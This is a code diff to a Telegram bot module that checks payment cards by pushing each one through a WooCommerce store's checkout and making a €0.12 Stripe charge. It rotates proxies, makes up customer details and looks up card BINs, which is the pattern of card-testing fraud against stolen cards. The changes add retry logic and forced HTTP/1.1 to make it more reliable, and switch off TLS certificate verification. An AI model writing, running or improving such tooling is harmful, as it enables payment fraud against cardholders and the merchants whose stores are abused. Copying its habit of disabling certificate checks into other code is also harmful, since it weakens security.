@@ -1,6 +1,7 @@
 # BOT/gates/charge/scharge012.py
 # Stripe Charge €0.12 - Compatible with WAYNE Bot Structure
 # FIXED: Proxy system integration, message trimming, VPS compatibility
+# VPS FIX: HTTP/1.1 force, SSL context, retry logic, connection handling
 
 import json
 import asyncio
@@ -10,6 +11,7 @@ import httpx
 import random
 import string
 import os
+import ssl
 from datetime import datetime, timedelta
 from pyrogram import Client, filters
 from pyrogram.types import Message
@@ -360,7 +362,7 @@ class StripeCharge012Checker:
             url = f"https://bins.antipublic.cc/bins/{bin_number}"
             headers = {'User-Agent': self.user_agent}
 
-            async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
+            async with httpx.AsyncClient(timeout=10.0, verify=False, http1=True) as client:
                 response = await client.get(url, headers=headers)
 
                 if response.status_code == 200:
@@ -587,41 +589,62 @@ class StripeCharge012Checker:
         delay = random.uniform(min_delay, max_delay)
         await asyncio.sleep(delay)
 
-    async def make_request(self, method, url, **kwargs):
-        """Make request with proper headers and cookie handling using proxy"""
-        headers = kwargs.get('headers', {}).copy()
+    async def make_request_with_retry(self, method, url, max_retries=3, **kwargs):
+        """Make request with retry logic for VPS compatibility"""
+        last_exception = None
         
-        # Merge with base headers
-        base_headers = self.get_base_headers()
-        for key, value in base_headers.items():
-            if key not in headers:
-                headers[key] = value
-        
-        # Update dynamic headers
-        headers['User-Agent'] = self.user_agent
-        headers['Accept-Language'] = self.accept_language
-        
-        kwargs['headers'] = headers
+        for attempt in range(max_retries):
+            try:
+                if attempt > 0:
+                    logger.warning(f"Retry attempt {attempt}/{max_retries} for {url}")
+                    await asyncio.sleep(1.5 * attempt)  # Exponential backoff
+                
+                headers = kwargs.get('headers', {}).copy()
+                
+                # Merge with base headers
+                base_headers = self.get_base_headers()
+                for key, value in base_headers.items():
+                    if key not in headers:
+                        headers[key] = value
+                
+                # Update dynamic headers
+                headers['User-Agent'] = self.user_agent
+                headers['Accept-Language'] = self.accept_language
+                
+                kwargs['headers'] = headers
 
-        try:
-            response = await self.client.request(method, url, **kwargs)
-            
-            # Store cookies from response
-            if response.cookies:
-                for name, value in response.cookies.items():
-                    self.cookies[name] = value
-            
-            return response
-        except Exception as e:
-            logger.error(f"Request error: {str(e)}")
-            raise e
+                response = await self.client.request(method, url, **kwargs)
+                
+                # Store cookies from response
+                if response.cookies:
+                    for name, value in response.cookies.items():
+                        self.cookies[name] = value
+                
+                return response
+                
+            except (httpx.ConnectError, httpx.NetworkError, httpx.ProtocolError) as e:
+                last_exception = e
+                logger.warning(f"Connection error on attempt {attempt + 1}: {str(e)}")
+                if attempt < max_retries - 1:
+                    continue
+                else:
+                    raise last_exception
+            except httpx.TimeoutException as e:
+                last_exception = e
+                logger.warning(f"Timeout on attempt {attempt + 1}")
+                if attempt < max_retries - 1:
+                    continue
+                else:
+                    raise last_exception
+        
+        raise last_exception if last_exception else Exception("All retry attempts failed")
 
     async def initialize_session(self):
         """Initialize session with proper cookies and proxy"""
         try:
             logger.step(1, 6, "Initializing session...")
 
-            response = await self.make_request('GET', f"{self.base_url}/")
+            response = await self.make_request_with_retry('GET', f"{self.base_url}/")
 
             if response.status_code == 200:
                 logger.success("Session initialized successfully")
@@ -640,7 +663,7 @@ class StripeCharge012Checker:
             logger.step(2, 6, "Adding product to cart...")
 
             # Load product page first
-            response = await self.make_request('GET', self.product_url)
+            response = await self.make_request_with_retry('GET', self.product_url)
 
             if response.status_code not in [200, 202]:
                 return False, f"Failed to load product page: {response.status_code}"
@@ -679,7 +702,7 @@ class StripeCharge012Checker:
                 "Referer": self.product_url,
             }
 
-            response = await self.make_request('POST', self.product_url, headers=add_headers, content=cart_data.encode())
+            response = await self.make_request_with_retry('POST', self.product_url, headers=add_headers, content=cart_data.encode())
 
             if response.status_code in [200, 202, 302]:
                 logger.success("Product added to cart successfully")
@@ -696,7 +719,7 @@ class StripeCharge012Checker:
         try:
             logger.step(3, 6, "Loading checkout page...")
 
-            response = await self.make_request('GET', f"{self.base_url}/checkout/")
+            response = await self.make_request_with_retry('GET', f"{self.base_url}/checkout/")
 
             if response.status_code != 200:
                 return False, f"Failed to load checkout page: {response.status_code}"
@@ -830,7 +853,7 @@ class StripeCharge012Checker:
 
             logger.network(f"Sending update_order_review with security nonce: {self.update_order_review_nonce}")
 
-            response = await self.make_request('POST', f"{self.base_url}/?wc-ajax=update_order_review", headers=update_headers, data=post_data)
+            response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=update_order_review", headers=update_headers, data=post_data)
 
             logger.network(f"Update order review response status: {response.status_code}")
 
@@ -858,7 +881,7 @@ class StripeCharge012Checker:
                         f"woocommerce-process-checkout-nonce={self.checkout_nonce or ''}"
                     )
                     
-                    response = await self.make_request('POST', f"{self.base_url}/?wc-ajax=update_order_review", headers=update_headers, data=post_data)
+                    response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=update_order_review", headers=update_headers, data=post_data)
                     
                     if response.status_code == 200:
                         return True, None
@@ -920,7 +943,7 @@ class StripeCharge012Checker:
             }
 
             # Use separate client for Stripe (no proxy needed for Stripe API)
-            async with httpx.AsyncClient() as stripe_client:
+            async with httpx.AsyncClient(http1=True, verify=False) as stripe_client:
                 response = await stripe_client.post(
                     "https://api.stripe.com/v1/payment_methods",
                     data=payment_data,
@@ -1010,7 +1033,7 @@ class StripeCharge012Checker:
                 "Referer": f"{self.base_url}/checkout/",
             }
 
-            response = await self.make_request('POST', f"{self.base_url}/?wc-ajax=checkout", headers=checkout_headers, data=checkout_data)
+            response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=checkout", headers=checkout_headers, data=checkout_data)
 
             response_text = response.text
 
@@ -1119,7 +1142,12 @@ class StripeCharge012Checker:
     async def check_card(self, card_details, username, user_data):
         """Main card checking method with proxy integration"""
         start_time = time.time()
-        logger.info(f"🔍 Starting Stripe Charge €0.12 check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")
+        cc = mes = ano = cvv = ""
+        bin_info = None
+        
+        # Mask card for logging
+        card_masked = card_details[:12] + "XXXX" + card_details[-4:] if len(card_details) > 4 else card_details
+        logger.info(f"🔍 Starting Stripe Charge €0.12 check: {card_masked}")
 
         # Step 0: Get proxy for user (INTEGRATED FROM SHOPIFY.PY)
         logger.step(0, 6, "Getting proxy...")
@@ -1134,31 +1162,69 @@ class StripeCharge012Checker:
             self.proxy_status = "Dead 🚫"
             return await self.format_response("", "", "", "", "ERROR", "No proxy available", username, time.time()-start_time, user_data)
         
-        # Initialize httpx client with proxy
-        self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30.0, follow_redirects=True, limits=httpx.Limits(max_keepalive_connections=2, max_connections=4), verify=False)
+        # VPS FIX: Create SSL context that allows all ciphers and protocols
+        ssl_context = ssl.create_default_context()
+        ssl_context.check_hostname = False
+        ssl_context.verify_mode = ssl.CERT_NONE
+        ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')
         
-        # Test the proxy quickly
-        start_test = time.time()
+        # VPS FIX: Initialize httpx client with HTTP/1.1 only and proper SSL
         try:
-            test_resp = await self.client.get("https://ipinfo.io/json", timeout=5)
-            self.proxy_response_time = time.time() - start_test
-            
-            if test_resp.status_code == 200:
-                self.proxy_status = "Live ⚡️"
-                self.proxy_used = True
-                logger.proxy(f"Proxy working: {self.proxy_url[:50]}... | Response: {self.proxy_response_time:.2f}s")
-                mark_proxy_success(self.proxy_url, self.proxy_response_time)
-            else:
-                self.proxy_status = "Dead 🚫"
-                mark_proxy_failed(self.proxy_url)
-                await self.client.aclose()
-                return await self.format_response("", "", "", "", "ERROR", "Proxy test failed", username, time.time()-start_time, user_data)
-                
+            self.client = httpx.AsyncClient(
+                proxy=self.proxy_url,
+                timeout=httpx.Timeout(30.0, connect=15.0),
+                follow_redirects=True,
+                limits=httpx.Limits(max_keepalive_connections=1, max_connections=2),
+                verify=ssl_context,  # Use custom SSL context
+                http1=True,  # FORCE HTTP/1.1 - VPS FIX
+                http2=False,  # DISABLE HTTP/2 - VPS FIX
+                trust_env=False  # Ignore environment proxy settings - VPS FIX
+            )
         except Exception as e:
+            logger.error(f"Failed to initialize HTTP client: {str(e)}")
+            self.proxy_status = "Dead 🚫"
+            mark_proxy_failed(self.proxy_url)
+            return await self.format_response("", "", "", "", "ERROR", f"Client init failed: {str(e)}", username, time.time()-start_time, user_data)
+        
+        # Test the proxy quickly with retry
+        start_test = time.time()
+        proxy_working = False
+        
+        for test_attempt in range(2):  # Try twice to test proxy
+            try:
+                test_resp = await self.client.get("https://ipinfo.io/json", timeout=10)
+                self.proxy_response_time = time.time() - start_test
+                
+                if test_resp.status_code == 200:
+                    self.proxy_status = "Live ⚡️"
+                    self.proxy_used = True
+                    logger.proxy(f"Proxy working: {self.proxy_url[:50]}... | Response: {self.proxy_response_time:.2f}s")
+                    mark_proxy_success(self.proxy_url, self.proxy_response_time)
+                    proxy_working = True
+                    break
+                else:
+                    logger.warning(f"Proxy test returned status {test_resp.status_code}")
+                    if test_attempt == 0:
+                        await asyncio.sleep(1)
+                        continue
+                    else:
+                        raise Exception(f"Proxy test failed with status {test_resp.status_code}")
+                        
+            except Exception as e:
+                logger.warning(f"Proxy test attempt {test_attempt + 1} failed: {str(e)}")
+                if test_attempt == 0:
+                    await asyncio.sleep(1.5)
+                    continue
+                else:
+                    self.proxy_status = "Dead 🚫"
+                    mark_proxy_failed(self.proxy_url)
+                    await self.client.aclose()
+                    return await self.format_response("", "", "", "", "ERROR", f"Proxy test failed: {str(e)}", username, time.time()-start_time, user_data)
+        
+        if not proxy_working:
             self.proxy_status = "Dead 🚫"
             mark_proxy_failed(self.proxy_url)
             await self.client.aclose()
-            logger.error(f"Proxy test error: {str(e)}")
             return await self.format_response("", "", "", "", "ERROR", "Proxy connection failed", username, time.time()-start_time, user_data)
 
         try:
@@ -1210,7 +1276,7 @@ class StripeCharge012Checker:
 
             logger.user(f"User: {user_info['first_name']} {user_info['last_name']} | {email} | {user_info['phone']}")
 
-            # Step 1: Initialize session (with proxy)
+            # Step 1: Initialize session (with proxy and retry)
             if not await self.initialize_session():
                 return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session", username, time.time()-start_time, user_data, bin_info)
 
@@ -1249,8 +1315,8 @@ class StripeCharge012Checker:
             mark_proxy_failed(self.proxy_url)
             self.proxy_status = "Dead 🚫"
             return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
-        except httpx.ConnectError:
-            logger.error("Connection error")
+        except httpx.ConnectError as e:
+            logger.error(f"Connection error: {str(e)}")
             mark_proxy_failed(self.proxy_url)
             self.proxy_status = "Dead 🚫"
             return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
@@ -1260,7 +1326,10 @@ class StripeCharge012Checker:
         finally:
             # Ensure client is closed
             if self.client:
-                await self.client.aclose()
+                try:
+                    await self.client.aclose()
+                except:
+                    pass
 
 # Command handler - MATCHING scharge1.py STYLE
 @Client.on_message(filters.command(["xx", ".xx", "$xx"]))
